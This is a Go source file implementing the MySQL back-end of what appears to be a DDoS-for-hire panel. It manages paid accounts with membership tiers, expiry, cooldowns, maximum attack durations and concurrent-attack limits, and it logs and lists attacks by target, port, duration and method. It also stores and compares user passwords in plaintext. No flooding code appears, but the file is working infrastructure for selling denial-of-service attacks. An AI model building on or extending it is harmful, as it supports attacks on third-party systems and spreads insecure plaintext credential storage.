package main

import (
	"database/sql"
	"fmt"
	"log"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	id          int
	username    string
	membership  int
	expiry      string
	vip         string
	private     string
	cooldown    int
	concurrents int
	maxtime     int
}

type CurrentAttack struct {
	username string
	target   string
	port     string
	duration int
	method   string
	end      string
}

type User struct {
	username   string
	password   string
	membership int
	expiry     string
	vip        string
	ip         string
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		log.Panic("\u001B[0m\u001B[107m\u001B[38;5;21m[DATABASE]\u001B[0m\u001B[38;5;196m Failed to connect.\u001B[0m", err)
		return nil
	}
	db.SetMaxOpenConns(0)
	db.SetMaxIdleConns(0)
	err = db.Ping()
	if err != nil {
		log.Panic("\u001B[0m\u001B[107m\u001B[38;5;21m[DATABASE]\u001B[0m\u001B[38;5;196m Failed to connect.\u001B[0m", err)
		return nil
	}
	log.Println("\u001B[0m\u001B[107m\u001B[38;5;21m[DATABASE]\u001B[0m\u001B[38;5;41m Connected.\u001B[0m")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, error) {
	rows, err := this.db.Query("SELECT password FROM users WHERE username = ?", username)
	if err != nil {
		return false, err
	}
	defer rows.Close()
	if !rows.Next() {
		return false, err
	}
	var passwordFromDatabase string
	err = rows.Scan(&passwordFromDatabase)
	if err != nil {
		return false, err
	}
	if password == passwordFromDatabase {
		return true, nil // Hasło poprawne
	}

	return false, nil // Hasło niepoprawne
}

func (this *Database) AddLoginLogs(username string, ip string) {
	ip = strings.Split(ip, ":")[0]
	_, err := this.db.Exec("INSERT INTO logins (username, ip, date) VALUES (?, ?, NOW())", username, ip)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) GetAccountInfo(username string) AccountInfo {
	//check if vip is null, if it is, set it to 0
	_, err := this.db.Query("UPDATE users SET vip = '0000-00-00 00:00:00' WHERE vip IS NULL")
	if err != nil {
		log.Println(err)
	}
	rows, err := this.db.Query("SELECT id, username, membership, expiry, vip, private, cooldown, concurrents, maxtime FROM users WHERE username = ?", username)
	if err != nil {
		log.Println(err.Error())
		return AccountInfo{0, "", 0, "0", "0", "0", 0, 1, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return AccountInfo{0, "", 0, "0", "0", "0", 0, 1, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.id, &accInfo.username, &accInfo.membership, &accInfo.expiry, &accInfo.vip, &accInfo.private, &accInfo.cooldown, &accInfo.concurrents, &accInfo.maxtime)
	return accInfo
}

func (this *Database) updateIp(username string, ip string) {
	_, err := this.db.Exec("UPDATE users SET ip = ? WHERE username = ?", ip, username)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) ExpireUser(username string, expiry string, expiryType string) bool {
	if expiryType == "days" || expiryType == "d" {
		_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(NOW(), INTERVAL ? DAY) WHERE username = ?", expiry, username)
		if err != nil {
			log.Println(err)
			return false
		}
	} else if expiryType == "hours" || expiryType == "h" {
		_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(NOW(), INTERVAL ? HOUR) WHERE username = ?", expiry, username)
		if err != nil {
			log.Println(err)
			return false
		}
	} else if expiryType == "months" || expiryType == "m" {
		_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(NOW(), INTERVAL ? MONTH) WHERE username = ?", expiry, username)
		if err != nil {
			log.Println(err)
			return false
		}
	} else if expiryType == "years" || expiryType == "y" {
		_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(NOW(), INTERVAL ? YEAR) WHERE username = ?", expiry, username)
		if err != nil {
			log.Println(err)
			return false
		}
	} else if expiryType == "lifetime" || expiryType == "l" {
		_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(NOW(), INTERVAL 10 YEAR) WHERE username = ?", username)
		if err != nil {
			log.Println(err)
			return false
		}
	} else {
		log.Println("Invalid expiry type")
		return false
	}
	return true
}

func (this *Database) CreateNewUser(username string, password string, membership int, expiry string, expiryType string, cooldown int, maxtime int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()
	if rows.Next() {
		log.Println("User already exists")
		return false
	}
	if expiryType == "days" || expiryType == "d" {
		_, err := this.db.Exec("INSERT INTO users (ip, cooldown, maxtime, username, password, membership, vip, expiry) VALUES ('', ?, ?, ?, ?, ?, DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_ADD(NOW(), INTERVAL ? DAY))", cooldown, maxtime, username, password, membership, expiry)
		if err != nil {
			log.Println(err)
		}
	} else if expiryType == "hours" || expiryType == "h" {
		_, err := this.db.Exec("INSERT INTO users (ip,cooldown, maxtime, username, password, membership, vip, expiry) VALUES ('', ?, ?, ?, ?, ?, DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_ADD(NOW(), INTERVAL ? HOUR))", cooldown, maxtime, username, password, membership, expiry)
		if err != nil {
			log.Println(err)
		}
	} else if expiryType == "months" || expiryType == "m" {
		_, err := this.db.Exec("INSERT INTO users (ip,cooldown, maxtime, username, password, membership, vip, expiry) VALUES ('', ?, ?, ?, ?, ?, DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_ADD(NOW(), INTERVAL ? MONTH))", cooldown, maxtime, username, password, membership, expiry)
		if err != nil {
			log.Println(err)
		}
	} else if expiryType == "years" || expiryType == "y" {
		_, err := this.db.Exec("INSERT INTO users (ip,cooldown, maxtime, username, password, membership, vip, expiry) VALUES ('', ?, ?, ?, ?, ?, DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_ADD(NOW(), INTERVAL ? YEAR))", cooldown, maxtime, username, password, membership, expiry)
		if err != nil {
			log.Println(err)
		}
	} else if expiryType == "lifetime" || expiryType == "l" {
		_, err := this.db.Exec("INSERT INTO users (ip,cooldown, maxtime, username, password, membership, vip, expiry) VALUES ('', ?, ?, ?, ?, ?, DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_ADD(NOW(), INTERVAL 10 YEAR))", cooldown, maxtime, username, password, membership)
		if err != nil {
			log.Println(err)
		}
	} else {
		log.Println("Invalid expiry type")
		return false
	}
	return true
}

func (this *Database) BlockHost(ip string) {
	_, err := this.db.Exec("INSERT INTO blocked (ip) VALUES (?)", ip)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) IsHostBlocked(ip string) bool {
	rows, err := this.db.Query("SELECT ip FROM blocked WHERE ip = ?", ip)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()
	return rows.Next()
}

func (this *Database) UnblockHost(ip string) {
	_, err := this.db.Exec("DELETE FROM blocked WHERE ip = ?", ip)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) GetBlockedHosts() []string {
	rows, err := this.db.Query("SELECT ip FROM blocked")
	if err != nil {
		log.Println(err)
		return nil
	}
	defer rows.Close()
	var ips []string
	for rows.Next() {
		var ip string
		rows.Scan(&ip)
		ips = append(ips, ip)
	}
	return ips
}

func (this *Database) DeleteUser(username string) {
	_, err := this.db.Exec("DELETE FROM users WHERE username = ?", username)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) ChangeMembership(username string, membership int) error {
	_, err := this.db.Exec("UPDATE users SET membership = ? WHERE username = ?", membership, username)
	return err
}

func (this *Database) VipUser(username string, lengthInDays int) bool {
	_, err := this.db.Exec("UPDATE users SET vip = DATE_ADD(NOW(), INTERVAL ? DAY) WHERE username = ?", lengthInDays, username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) ChangeMaxtime(username string, maxtime int) bool {
	_, err := this.db.Exec("UPDATE users SET maxtime = ? WHERE username = ?", maxtime, username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) ChangeCooldown(username string, cooldown int) bool {
	_, err := this.db.Exec("UPDATE users SET cooldown = ? WHERE username = ?", cooldown, username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) PrivateUser(username string, lengthInDays int) bool {
	_, err := this.db.Exec("UPDATE users SET private = DATE_ADD(NOW(), INTERVAL ? DAY) WHERE username = ?", lengthInDays, username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) RemovePrivate(username string) bool {
	_, err := this.db.Exec("UPDATE users SET private = '0000-00-00 00:00:00' WHERE username = ?", username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) RemoveVip(username string) bool {
	_, err := this.db.Exec("UPDATE users SET vip = '0000-00-00 00:00:00' WHERE username = ?", username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) isVip(username string) bool {
	var vip string
	err := this.db.QueryRow("SELECT vip FROM users WHERE username = ?", username).Scan(&vip)
	if err != nil {
		log.Println(err)
		return false
	}
	//check if vip is not expired
	vipTime, err := time.Parse("2006-01-02 15:04:05", vip)
	if err != nil {
		log.Println(err)
		return false
	}

	loc, _ := time.LoadLocation("Europe/Warsaw")
	now := time.Now().In(loc)
	year, month, day := now.Date()
	hour, mins, sec := now.Clock()
	nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), vipTime.Location())
	timeUntilVipExpiry := vipTime.Sub(nowLocal)
	if timeUntilVipExpiry < 0 {
		return false
	}
	if vip == "0000-00-00 00:00:00" || vip == "" {
		return false
	}
	return true
}

func (this *Database) isPrivate(username string) bool {
	var private string
	err := this.db.QueryRow("SELECT private FROM users WHERE username = ?", username).Scan(&private)
	if err != nil {
		log.Println(err)
		return false
	}
	//check if private is not expired
	privateTime, err := time.Parse("2006-01-02 15:04:05", private)
	if err != nil {
		log.Println(err)
		return false
	}

	loc, _ := time.LoadLocation("Europe/Warsaw")
	now := time.Now().In(loc)
	year, month, day := now.Date()
	hour, mins, sec := now.Clock()
	nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), privateTime.Location())
	timeUntilPrivateExpiry := privateTime.Sub(nowLocal)
	if timeUntilPrivateExpiry < 0 {
		return false
	}
	if private == "0000-00-00 00:00:00" || private == "" {
		return false
	}
	return true
}

func (this *Database) GetUsers(page int) ([]User, int) {
	rows, err := this.db.Query("SELECT username, membership, expiry, vip, password, ip FROM users")
	if err != nil {
		log.Println(err)
		return nil, 0
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		var vip sql.NullString
		err := rows.Scan(&user.username, &user.membership, &user.expiry, &vip, &user.password, &user.ip)
		if vip.String != "" {
			user.vip = vip.String
		} else {
			user.vip = "2006-01-02 15:04:05"
		}
		if err != nil {
			log.Println(err)
			return nil, 0
		}
		users = append(users, user)
	}

	totalPages := int(len(users)/10) + 1 // Calculate total pages rounding up
	if page < 1 || page > totalPages {
		log.Println("Invalid page number")
		return nil, totalPages
	}

	startIndex := (page - 1) * 10
	endIndex := page * 10
	if endIndex > len(users) {
		endIndex = len(users)
	}

	log.Println("Total pages:", totalPages)
	log.Println("Start index:", startIndex)
	log.Println("End index:", endIndex)
	log.Println("Users length:", len(users))

	return users[startIndex:endIndex], totalPages
}

func (this *Database) ChangePassword(username string, newPassword string) error {
	_, err := this.db.Exec("UPDATE users SET password = ? WHERE username = ?", newPassword, username)
	return err
}

func (this *Database) logAttack(username string, target string, port string, duration int, method string) {
	_, err := this.db.Exec("INSERT INTO attacks (username, target, port, duration, method, hitted, end) VALUES (?, ?, ?, ?, ?, NOW(), DATE_ADD(NOW(), INTERVAL ? SECOND))", username, target, port, duration, method, duration)
	if err != nil {
		log.Println(err)
	}
}

func (this *Database) howLongOnCooldown(username string, cooldown int) int {
	var hittedStr string
	var endStr string
	err := this.db.QueryRow("SELECT hitted, NOW() FROM attacks WHERE username = ? ORDER BY id DESC LIMIT 1;", username).Scan(&hittedStr, &endStr)
	if err != nil {
		fmt.Println("Error fetching hitted time:", err)
		return 0
	}

	log.Println("hitted datetime:", hittedStr)
	log.Println("end datetime:", endStr)

	hittedTime, err := time.Parse("2006-01-02 15:04:05", hittedStr)
	if err != nil {
		fmt.Println("Error parsing hitted time:", err)
		return 0
	}

	endTime, err := time.Parse("2006-01-02 15:04:05", endStr)
	if err != nil {
		fmt.Println("Error parsing end time:", err)
		return 0
	}

	remainingCooldown := int(endTime.Sub(hittedTime).Seconds())

	if cooldown-remainingCooldown < 0 {
		return 0
	}

	return cooldown - remainingCooldown
}

func (this *Database) isAccountExpired(username string) bool {
	var expiryStr string
	err := this.db.QueryRow("SELECT expiry FROM users WHERE username = ?", username).Scan(&expiryStr)
	if err != nil {
		// Handle error
		fmt.Println("Error fetching expiry time:", err)
		return true
	}

	fmt.Println("Retrieved expiry datetime:", expiryStr)

	// Parse the expiry datetime string into a time.Time object
	expiryTime, err := time.Parse("2006-01-02 15:04:05", expiryStr)
	if err != nil {
		// Handle error
		fmt.Println("Error parsing expiry time:", err)
		return true
	}

	fmt.Println("Parsed expiry time:", expiryTime)

	if time.Now().After(expiryTime) {
		return true
	}
	return false
}

func (this *Database) getCurrentAttacksLength() int {
	rows, err := this.db.Query("SELECT COUNT(*) as target FROM attacks WHERE end > NOW()")
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()
	if !rows.Next() {
		return 0
	}
	var target int
	rows.Scan(&target)
	return target
}

func (this *Database) getCurrentAttacks() []CurrentAttack {
	rows, err := this.db.Query("SELECT username, target, port, duration, method, end FROM attacks WHERE end > NOW()")
	if err != nil {
		log.Println(err)
		return nil
	}
	defer rows.Close()
	var attacks []CurrentAttack
	for rows.Next() {
		var attack CurrentAttack
		rows.Scan(&attack.username, &attack.target, &attack.port, &attack.duration, &attack.method, &attack.end)
		attacks = append(attacks, attack)
	}
	return attacks
}

func (this *Database) getUserCurrentAttacksCount(username string) int {
	rows, err := this.db.Query("SELECT COUNT(*) as target FROM attacks WHERE username = ? AND end > NOW()", username)
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()
	if !rows.Next() {
		return 0
	}
	var target int
	rows.Scan(&target)
	return target
}

func (this *Database) CheckIfIpExists(user string) bool {
	rows, err := this.db.Query("SELECT ip FROM users WHERE username = ?", user)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()
	if !rows.Next() {
		return false
	}
	var ip string
	rows.Scan(&ip)
	if ip == "" {
		return false
	}
	return true
}

func (this *Database) AddDaysEveryone(days int) bool {
	_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(expiry, INTERVAL ? DAY)", days)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) AddDays(username string, days int) bool {
	_, err := this.db.Exec("UPDATE users SET expiry = DATE_ADD(expiry, INTERVAL ? DAY) WHERE username = ?", days, username)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) ChangeConcurrents(username string, concurrents int) interface{} {
	_, err := this.db.Exec("UPDATE users SET concurrents = ? WHERE username = ?", concurrents, username)
	if err != nil {
		log.Println(err)
		return err
	}
	return nil
}

func (this *Database) isSpamming(s string) bool {
	log.Println(s)
	rows, err := this.db.Query("SELECT count(id) as count FROM attacks WHERE target = ? AND hitted > DATE_SUB(NOW(), INTERVAL 10 MINUTE)", s)
	if err != nil {
		log.Println(err)
		return true
	}
	var count int
	rows.Next()
	rows.Scan(&count)
	if count > 1 {
		return true
	}
	return false
}

func (this *Database) ChangeUserUsername(s string, s2 string) bool {
	//check if username already exists
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", s2)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()
	if rows.Next() {
		return false
	}
	_, err = this.db.Exec("UPDATE users SET username = ? WHERE username = ?", s2, s)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func (this *Database) ChangeUserPass(s string, s2 string) bool {
	_, err := this.db.Exec("UPDATE users SET password = ? WHERE username = ?", s2, s)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}
